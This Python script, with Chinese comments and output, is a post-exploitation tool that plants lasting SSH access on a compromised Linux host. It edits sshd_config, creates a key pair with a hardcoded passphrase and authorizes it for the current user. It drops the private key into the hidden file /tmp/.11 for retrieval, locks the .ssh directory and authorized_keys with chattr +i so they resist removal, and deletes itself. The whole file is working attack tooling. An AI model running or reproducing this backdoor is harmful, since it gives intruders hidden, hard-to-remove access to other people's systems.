# coding=utf-8
# !/usr/bin/env python
from __future__ import print_function
import subprocess
import os,sys

def ml(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.wait()  # 等待子进程完成

    stdout, stderr = process.communicate()  # 获取子进程的输出和错误
    try:
        decoded_stdout = stdout.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stdout = stdout.decode('latin1')
    try:
        decoded_stderr = stderr.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stderr = stderr.decode('latin1')
    return decoded_stdout


def miyue(new_content):
    filename = "/etc/ssh/sshd_config"
    with open(filename, 'a') as file:
        file.write(new_content + '\n')


def generate_ssh_key(password,user):
    if 'root' in user:
        command = 'ssh-keygen -t ed25519 -N "' + password + '" -q -f /' + user + '/.ssh/id_ed25519'
    else:
        command = 'ssh-keygen -t ed25519 -N "' + password + '" -q -f /home/' + user + '/.ssh/id_ed25519'
    # 连接PubkeyAcceptedKeyTypes=+ssh-rsa
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = p.communicate()
    if p.returncode == 0:
        print("SSH密钥生成成功！")
    else:
        print("SSH密钥生成失败。错误信息：")
        print(error.decode())

def file_key(user,keyt):
    if 'root' in user:
        file_path = "/" + user + "/.ssh/authorized_keys"
    else:
        file_path = "/home/" + user + "/.ssh/authorized_keys"
    if os.path.exists(file_path):
        print("文件写入成功")
        id_ed25519(user,keyt)
    else:
        print("文件写入失败")

def id_ed25519(user,keyt):
    if 'root' in user:
        file_path = "/" + user + "/.ssh/id_ed25519.pub"
        file_path2 = "/" + user + "/.ssh/id_ed25519"
    else:
        file_path = "/home/" + user + "/.ssh/id_ed25519.pub"
        file_path2 = "/home/" + user + "/.ssh/id_ed25519"
    if os.path.exists(file_path) and os.path.exists(file_path2):
        print("id_ed25519.pub&id_ed25519删除失败")
    else:
        print("id_ed25519.pub&id_ed25519删除成功")
        print('----->利用成功,生成的用户为:',ml('whoami').strip(),'<-----')
        print('----->连接命令: ssh -i 密钥文件 '+ str(ml('whoami').strip())+'@ip <-----')
        print('请下载{'+keyt+'}密钥文件连接')



def delete_current_script():
    try:
        script_path = os.path.abspath(sys.argv[0])
        os.remove(script_path)
        print("当前脚本文件已成功删除"+script_path)
    except Exception as e:
        print("无法删除当前脚本文件：", e)

if __name__ == '__main__':
    # 调用 miyue 函数来在文件末尾写入新内容
    # 调用 generate_ssh_key 函数生成SSH密钥对
    try:
        miyue("HostKey /etc/ssh/ssh_host_ed25519_key")
        miyue("PubkeyAuthentication yes")
        miyue("AuthorizedKeysFile .ssh/authorized_keys")
    except Exception as e:
        print('低权限用户配置文件写入失败，有的低权限用户不影响使用')
    user = ml('whoami').strip()
    password = "admin!@#45123"
    keyt = '/tmp/.11'
    generate_ssh_key(password,user)
    if 'root' in user:
        ml('cat /' + user + '/.ssh/id_ed25519.pub >> /' + user + '/.ssh/authorized_keys && chmod 600 /' + user + '/.ssh/authorized_keys && chmod 700 /' + user + '/.ssh/')
        ml('cp /' + user + '/.ssh/id_ed25519 '+keyt)
        ml('rm -rf /' + user + '/.ssh/id_ed25519 && rm -rf /'+ user + '/.ssh/id_ed25519.pub')
        ml('chattr +i /' + user + '/.ssh && chattr +i /' + user + '/.ssh/authorized_keys')
    else:
        ml('cat /home/' + user + '/.ssh/id_ed25519.pub >>  /home/' + user + '/.ssh/authorized_keys && chmod 600  /home/' + user + '/.ssh/authorized_keys && chmod 700  /home/' + user + '/.ssh/')
        ml('cp  /home/' + user + '/.ssh/id_ed25519 '+keyt)
        ml('rm -rf  /home/' + user + '/.ssh/id_ed25519 && rm -rf  /home/'+ user + '/.ssh/id_ed25519.pub')
        ml('chattr +i  /home/' + user + '/.ssh && chattr +i /' + user + ' /home/.ssh/authorized_keys')
    file_key(user,keyt)
    delete_current_script()  # 删除当前执行脚本文件
